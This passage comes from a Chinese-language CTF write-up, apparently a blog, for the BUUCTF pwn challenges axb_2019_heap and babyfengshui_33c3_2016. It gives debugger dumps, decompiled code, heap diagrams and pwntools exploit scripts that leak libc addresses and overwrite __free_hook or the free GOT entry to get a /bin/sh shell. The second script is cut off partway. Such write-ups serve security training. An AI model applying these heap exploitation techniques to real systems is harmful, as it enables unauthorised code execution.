<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack 20</span><br><span class="line">0000| 0x7fffffffde10 --&gt; 0x0 </span><br><span class="line">0008| 0x7fffffffde18 --&gt; 0x61616161ffffde30 </span><br><span class="line">0016| 0x7fffffffde20 (&#x27;a&#x27; &lt;repeats 15 times&gt;)</span><br><span class="line">0024| 0x7fffffffde28 --&gt; 0x61616161616161 (&#x27;aaaaaaa&#x27;)</span><br><span class="line">0032| 0x7fffffffde30 --&gt; 0x7fffffffde50 --&gt; 0x555555555200 (&lt;__libc_csu_init&gt;:	push   r15)</span><br><span class="line">0040| 0x7fffffffde38 --&gt; 0x555555555186 (&lt;main+28&gt;:	mov    eax,0x0)</span><br><span class="line">0048| 0x7fffffffde40 --&gt; 0x7fffffffdf30 --&gt; 0x1 </span><br><span class="line">0056| 0x7fffffffde48 --&gt; 0x0 </span><br><span class="line">0064| 0x7fffffffde50 --&gt; 0x555555555200 (&lt;__libc_csu_init&gt;:	push   r15)</span><br><span class="line">0072| 0x7fffffffde58 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)</span><br><span class="line">0080| 0x7fffffffde60 --&gt; 0x1 </span><br><span class="line">0088| 0x7fffffffde68 --&gt; 0x7fffffffdf38 --&gt; 0x7fffffffe2a7 (&quot;/home/joe1sn/Documents/question/abx_2019_heap/axb_2019_heap&quot;)</span><br><span class="line">0096| 0x7fffffffde70 --&gt; 0x1f7ffcca0 </span><br><span class="line">0104| 0x7fffffffde78 --&gt; 0x55555555516a (&lt;main&gt;:	push   rbp)</span><br><span class="line">0112| 0x7fffffffde80 --&gt; 0x0 </span><br><span class="line">0120| 0x7fffffffde88 --&gt; 0xa45414fa738fad69 </span><br><span class="line">0128| 0x7fffffffde90 --&gt; 0x555555554980 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">0136| 0x7fffffffde98 --&gt; 0x7fffffffdf30 --&gt; 0x1 </span><br><span class="line">0144| 0x7fffffffdea0 --&gt; 0x0 </span><br><span class="line">0152| 0x7fffffffdea8 --&gt; 0x0 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>偏移</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ fmtarg 0x7fffffffde50 #base offset</span><br><span class="line">The index of format argument : 14 (&quot;\%13$p&quot;)</span><br><span class="line">gdb-peda$ fmtarg 0x7fffffffde58 #libc offset</span><br><span class="line">The index of format argument : 15 (&quot;\%14$p&quot;)</span><br></pre></td></tr></table></figure>
<p><strong>vmmap</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x0000555555554000 0x0000555555556000 r-xp	/home/joe1sn/Documents/question/abx_2019_heap/axb_2019_heap</span><br><span class="line">...........</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">...........</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(<span class="number">0x7ffff7a2d830</span> - <span class="number">0x00007ffff7a0d000</span>) <span class="comment">#libc 偏移量</span></span><br><span class="line"><span class="string">&#x27;0x20830&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(<span class="number">0x555555555200</span> - <span class="number">0x0000555555554000</span>)</span><br><span class="line"><span class="string">&#x27;0x1200&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="4exp-2"><a class="markdownIt-Anchor" href="#4exp-2"></a> 4.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;./axb_2019_heap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/joe1sn/libc/64/libc-2.23.so&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./axb_2019_heap&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,&quot;25618&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,sz,text</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,text</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;%14$p-%15$p&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Hello, &quot;</span>)</span><br><span class="line">	axb_leak = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">	libc_leak = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">	axb_base = axb_leak-<span class="number">0x1200</span></span><br><span class="line">	libc_base = libc_leak-<span class="number">0x20830</span></span><br><span class="line">	bss_addr = axb_base+<span class="number">0x202060</span></span><br><span class="line">	sys_addr = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">	free_addr = libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"></span><br><span class="line">	success(<span class="string">&quot;axb base=&gt;0x%x&quot;</span>,axb_leak)</span><br><span class="line">	success(<span class="string">&quot;libc base=&gt;0x%x&quot;</span>,libc_base)</span><br><span class="line">	success(<span class="string">&quot;bss addr=&gt;0x%x&quot;</span>,bss_addr)</span><br><span class="line">	success(<span class="string">&quot;system addr=&gt;0x%x&quot;</span>,sys_addr)</span><br><span class="line">	success(<span class="string">&quot;free addr=&gt;0x%x&quot;</span>,free_addr)</span><br><span class="line">	</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">0x98</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x98</span>)</span><br><span class="line">	add(<span class="number">1</span>,<span class="number">0x98</span>,<span class="string">&#x27;1111&#x27;</span>)</span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">&#x27;2222&#x27;</span>)</span><br><span class="line">	add(<span class="number">3</span>,<span class="number">0x90</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">		<span class="comment"># fake chunk  fake.sz  fake.fd             fake.bk			repair	</span></span><br><span class="line">	payload=p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(bss_addr-<span class="number">0x18</span>)+p64(bss_addr-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0x90</span>)+<span class="string">&#x27;\xa0&#x27;</span></span><br><span class="line">	edit(<span class="number">0</span>,payload)</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	delete(<span class="number">1</span>) <span class="comment">#free fake chunk</span></span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_addr)+p64(<span class="number">0x10</span>))<span class="comment">#in fake chunks</span></span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	edit(<span class="number">0</span>,p64(sys_addr))<span class="comment">#free-&gt;got</span></span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	delete(<span class="number">3</span>)</span><br><span class="line">	p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="babyfengshui_33c3_2016"><a class="markdownIt-Anchor" href="#babyfengshui_33c3_2016"></a> babyfengshui_33c3_2016</h2>
<h3 id="1checksec-9"><a class="markdownIt-Anchor" href="#1checksec-9"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/joe1sn/Documents/ctf/questions/BUUCTF/pwn/babyfengshui_33c3_2016/babyfengshui&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>RELRO:  Partial RELRO</code>可以改写GOT表</p>
</blockquote>
<h3 id="2ida-9"><a class="markdownIt-Anchor" href="#2ida-9"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v0; <span class="comment">// [esp+3h] [ebp-15h]</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;0: Add a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1: Delete a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2: Display a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3: Update a user description&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4: Exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Action: &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1) == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size of description: &quot;</span>);          <span class="comment">// size of chunk</span></span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u%c&quot;</span>, &amp;v2, &amp;v0);</span><br><span class="line">      add_usr(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">      delet_usr(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">      display(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">      text_rewrite(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)byte_804B069 &gt; <span class="number">0x31</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;maximum capacity exceeded, bye&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>add_usr</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__cdecl <span class="title function_">add_usr</span><span class="params">(<span class="type">size_t</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *s; <span class="comment">// ST24_4</span></span><br><span class="line">  _DWORD *v2; <span class="comment">// ST28_4</span></span><br><span class="line"></span><br><span class="line">  s = <span class="built_in">malloc</span>(a1);                               <span class="comment">// 申请的description大小</span></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, a1);</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v2, <span class="number">0</span>, <span class="number">0x80</span>u);                         <span class="comment">// v2的大小为0x80</span></span><br><span class="line">  *v2 = s;</span><br><span class="line">  ptr[(<span class="type">unsigned</span> __int8)byte_804B069] = v2;      <span class="comment">// 将指针保存至指针数组中</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;name: &quot;</span>);</span><br><span class="line">  sub_80486BB((<span class="type">char</span> *)ptr[(<span class="type">unsigned</span> __int8)byte_804B069] + <span class="number">4</span>, <span class="number">0x7C</span>);<span class="comment">// fgets 0x7个字符</span></span><br><span class="line">  text_rewrite(++byte_804B069 - <span class="number">1</span>);             <span class="comment">// 写入text</span></span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;                                               </span><br></pre></td></tr></table></figure>
<blockquote>
<p>函数首先分配一个description的最大空间，让你后再分配给user结构体的空间，并将user放入store数组中，最后调用更新decription的函数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *desc;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x7c</span>];</span><br><span class="line">&#125;user;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span> *<span class="title">store</span>[];</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>store放在0x804b080，当前user个数user_num放在0x804b069（byte_804B069）</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qinying001/article/details/104359401">https://blog.csdn.net/qinying001/article/details/104359401</a></p>
<p>可以从这篇文章看堆的情况，这里我大致画一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#code</span></span><br><span class="line">add_user(<span class="number">0x80</span>, <span class="number">0x80</span>, <span class="string">&#x27;AAAA&#x27;</span>)        <span class="comment"># 0</span></span><br><span class="line">add_user(<span class="number">0x80</span>, <span class="number">0x80</span>, <span class="string">&#x27;AAAA&#x27;</span>)        <span class="comment"># 1  </span></span><br><span class="line">add_user(<span class="number">0x8</span>, <span class="number">0x8</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)   <span class="comment"># 2</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">=========================================</span><br><span class="line">|| chunk0_desc 0x80 | chunk0_node 0x80 ||</span><br><span class="line">=========================================</span><br><span class="line">|| chunk1_desc 0x80 | chunk1_node 0x80 ||</span><br><span class="line">=========================================</span><br><span class="line">|| chunk2_desc 0x8  | chunk2_node 0x8  || </span><br><span class="line">=========================================</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#code</span></span><br><span class="line">delete_user(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">=========================================</span><br><span class="line">|| 			freed_chunk 0x100		   ||</span><br><span class="line">=========================================</span><br><span class="line">|| chunk1_desc 0x80 | chunk1_node 0x80 ||</span><br><span class="line">=========================================</span><br><span class="line">|| chunk2_desc 0x8  | chunk2_node 0x8  || </span><br><span class="line">=========================================</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#code</span></span><br><span class="line">add_user(<span class="number">0x100</span>, <span class="number">0x19c</span>, <span class="string">&quot;A&quot;</span>*(<span class="number">0x100</span>+<span class="number">0x80</span>+<span class="number">0x8</span>+<span class="number">0x10</span>) + p32(elf.got[<span class="string">&#x27;free&#x27;</span>]))    <span class="comment"># 0 *desc-&gt;free_got</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">=======================</span><br><span class="line">|| chunk0_desc 0x100 || &lt;--first fit规则符合</span><br><span class="line">=========================================</span><br><span class="line">|| chunk1_desc 0x80  | chunk1_node 0x80 ||</span><br><span class="line">=========================================</span><br><span class="line">|| chunk2_desc 0x8   | chunk2_node 0x8  || </span><br><span class="line">=========================================</span><br><span class="line">|| chunk0_node 0x80  || &lt;--被重新分配</span><br><span class="line">=======================</span><br></pre></td></tr></table></figure>
<blockquote>
<p>所以我们首先添加两个user，用于绕过检查。</p>
<p>第3个user存放&quot;/bin/sh&quot;。</p>
<p>然后删 掉第1个user，并创建一个description很长的user，其长度是第1个user的description长度加上user结构体长度。这时候检查就绕了，我们可以在添加新user的时候修改description大小，造成堆溢出，并修改第2个user的user&gt;desc为free@got.plt，从而泄漏出libc地址。</p>
<p>得到system地址后，此时修 改第2个user的description，其实是修free的GOT，所以我们将其改成，system@got.plt。</p>
<p>最后删除第3个user，触发system(‘/bin/sh’)，得到shell</p>
<p>​				------《ctf_all_in_one》</p>
</blockquote>
<h3 id="3exp-8"><a class="markdownIt-Anchor" href="#3exp-8"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./babyfengshui&#x27;</span>,env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;./libc-2.23.so&#x27;</span>&#125;)</span><br><span class="line"><span class="comment">#io = remote(&quot;node3.buuoj.cn&quot;,29784)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;babyfengshui&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_user</span>(<span class="params">size, length, text</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Action: &quot;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;description: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;name: &quot;</span>, <span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;length: &quot;</span>, <span class="built_in">str</span>(length))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;text: &quot;</span>, text)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_user</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Action: &quot;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">display_user</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Action: &quot;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_desc</span>(<span class="params">idx, length, text</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Action: &quot;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;length: &quot;</span>, <span class="built_in">str</span>(length))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;text: &quot;</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GDB</span>():</span><br><span class="line">	context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">	gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    add_user(<span class="number">0x80</span>, <span class="number">0x80</span>, <span class="string">&#x27;AAAA&#x27;</span>)        <span class="comment"># 0</span></span><br><span class="line">    add_user(<span class="number">0x80</span>, <span class="number">0x80</span>, <span class="string">&#x27;AAAA&#x27;</span>)        <span class="comment"># 1</span></span><br><span class="line">    add_user(<span class="number">0x8</span>, <span class="number">0x8</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)   <span class="comment"># 2</span></span><br><span class="line">    delete_user(<span class="number">0</span>)</span><br><span class="line">    add_user(<span class="number">0x100</span>, <span class="number">0x19c</span>, <span class="string">&quot;A&quot;</span>*(<span class="number">0x100</span>+<span class="number">0x80</span>+<span class="number">0x8</span>+<span class="number">0x10</span>) + p32(elf.got[<span class="string">&#x27;free&#x27;</span>]))    <span class="comment"># 0</span></span><br><span class="line">    display_user(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;description: &quot;</span>)</span><br><span class="line">    free_addr = u32(io.recvn(<span class="number">4</span>))</span><br><span class="line">    system_addr = free_addr - 